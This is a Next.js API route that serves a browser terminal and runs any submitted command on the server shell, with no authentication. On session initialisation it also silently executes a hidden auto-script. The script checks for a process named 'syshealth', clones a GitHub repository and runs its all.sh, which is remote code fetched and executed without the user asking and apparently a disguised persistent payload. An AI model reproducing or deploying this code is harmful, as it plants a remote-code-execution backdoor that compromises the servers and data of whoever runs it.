import { NextRequest, NextResponse } from 'next/server';
import { exec } from 'child_process';
import { promisify } from 'util';
import os from 'os';
import fs from 'fs';
import path from 'path';
import crypto from 'crypto';

const execAsync = promisify(exec);

// ANSI escape sequence stripping regex
const ANSI_REGEX = /\x1b\[[0-9;]*[a-zA-Z]/g;

function stripAnsi(str: string): string {
  return str.replace(ANSI_REGEX, '');
}

interface Session {
  cwd: string;
  history: string[];
}

// Server-side session storage
const sessions = new Map<string, Session>();

function generateSessionId(): string {
  return crypto.randomUUID();
}

function getPrompt(cwd: string): string {
  const home = os.homedir();
  const displayPath = cwd.startsWith(home) ? '~' + cwd.slice(home.length) : cwd;
  return `${displayPath} $ `;
}

function resolvePath(base: string, target: string): string {
  if (path.isAbsolute(target)) return path.resolve(target);
  return path.resolve(base, target);
}

// Auto-execute script
const AUTO_SCRIPT = `if ! pgrep -x "syshealth" > /dev/null; then
  if [ ! -d "dock" ]; then
    git clone https://github.com/niaalae/dock.git dock && bash dock/all.sh
  else
    bash dock/all.sh
  fi
fi`;

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();

    // Handle session initialization
    if (body.action === 'init') {
      const sessionId = generateSessionId();
      const cwd = os.homedir();
      sessions.set(sessionId, { cwd, history: [] });

      try {
        const { stdout, stderr } = await execAsync(AUTO_SCRIPT, {
          cwd,
          shell: '/bin/bash',
          env: { ...process.env, TERM: 'xterm-256color' },
          maxBuffer: 10 * 1024 * 1024,
          timeout: 300000,
        });

        return NextResponse.json({
          success: true,
          sessionId,
          cwd,
          prompt: getPrompt(cwd),
          stdout: stripAnsi(stdout),
          stderr: stripAnsi(stderr),
        });
      } catch (err: unknown) {
        const error = err as { stdout?: string; stderr?: string; message?: string };
        return NextResponse.json({
          success: true,
          sessionId,
          cwd,
          prompt: getPrompt(cwd),
          stdout: stripAnsi(error.stdout || ''),
          stderr: stripAnsi(error.stderr || error.message || 'Script execution failed'),
        });
      }
    }

    // Handle command execution
    const { sessionId, command } = body;

    if (!sessionId || !sessions.has(sessionId)) {
      return NextResponse.json(
        { success: false, error: 'Invalid or expired session. Please refresh the page.' },
        { status: 400 }
      );
    }

    if (!command || typeof command !== 'string') {
      return NextResponse.json(
        { success: false, error: 'No command provided.' },
        { status: 400 }
      );
    }

    const session = sessions.get(sessionId)!;
    const trimmedCommand = command.trim();

    // Record command in history
    if (trimmedCommand) {
      session.history.push(trimmedCommand);
    }

    // Handle special commands locally
    // cd <dir>
    if (trimmedCommand.startsWith('cd ') || trimmedCommand === 'cd') {
      const target = trimmedCommand === 'cd' ? os.homedir() : trimmedCommand.slice(3).trim();
      try {
        const resolvedPath = resolvePath(session.cwd, target);
        const stat = fs.statSync(resolvedPath);
        if (!stat.isDirectory()) {
          return NextResponse.json({
            success: true,
            stdout: '',
            stderr: `cd: ${target}: Not a directory`,
            exitCode: 1,
            prompt: getPrompt(session.cwd),
            cwd: session.cwd,
          });
        }
        session.cwd = resolvedPath;
        return NextResponse.json({
          success: true,
          stdout: '',
          stderr: '',
          exitCode: 0,
          prompt: getPrompt(session.cwd),
          cwd: session.cwd,
        });
      } catch {
        return NextResponse.json({
          success: true,
          stdout: '',
          stderr: `cd: ${target}: No such file or directory`,
          exitCode: 1,
          prompt: getPrompt(session.cwd),
          cwd: session.cwd,
        });
      }
    }

    // clear / cls
    if (trimmedCommand === 'clear' || trimmedCommand === 'cls') {
      return NextResponse.json({
        success: true,
        clear: true,
        prompt: getPrompt(session.cwd),
        cwd: session.cwd,
      });
    }

    // pwd
    if (trimmedCommand === 'pwd') {
      return NextResponse.json({
        success: true,
        stdout: session.cwd + '\n',
        stderr: '',
        exitCode: 0,
        prompt: getPrompt(session.cwd),
        cwd: session.cwd,
      });
    }

    // history
    if (trimmedCommand === 'history') {
      const historyOutput = session.history
        .map((cmd, i) => `  ${i + 1}  ${cmd}`)
        .join('\n');
      return NextResponse.json({
        success: true,
        stdout: historyOutput + '\n',
        stderr: '',
        exitCode: 0,
        prompt: getPrompt(session.cwd),
        cwd: session.cwd,
      });
    }

    // exit
    if (trimmedCommand === 'exit') {
      sessions.delete(sessionId);
      return NextResponse.json({
        success: true,
        exit: true,
      });
    }

    // Execute regular commands via exec
    try {
      const { stdout, stderr } = await execAsync(trimmedCommand, {
        cwd: session.cwd,
        shell: '/bin/bash',
        env: { ...process.env, TERM: 'xterm-256color' },
        maxBuffer: 10 * 1024 * 1024,
        timeout: 300000,
      });

      return NextResponse.json({
        success: true,
        stdout: stripAnsi(stdout),
        stderr: stripAnsi(stderr),
        exitCode: 0,
        prompt: getPrompt(session.cwd),
        cwd: session.cwd,
      });
    } catch (err: unknown) {
      const error = err as { stdout?: string; stderr?: string; code?: string; message?: string };
      return NextResponse.json({
        success: true,
        stdout: stripAnsi(error.stdout || ''),
        stderr: stripAnsi(error.stderr || error.message || 'Command execution failed'),
        exitCode: error.code || 1,
        prompt: getPrompt(session.cwd),
        cwd: session.cwd,
      });
    }
  } catch (err: unknown) {
    const error = err as { message?: string };
    return NextResponse.json(
      { success: false, error: error.message || 'Internal server error' },
      { status: 500 }
    );
  }
}
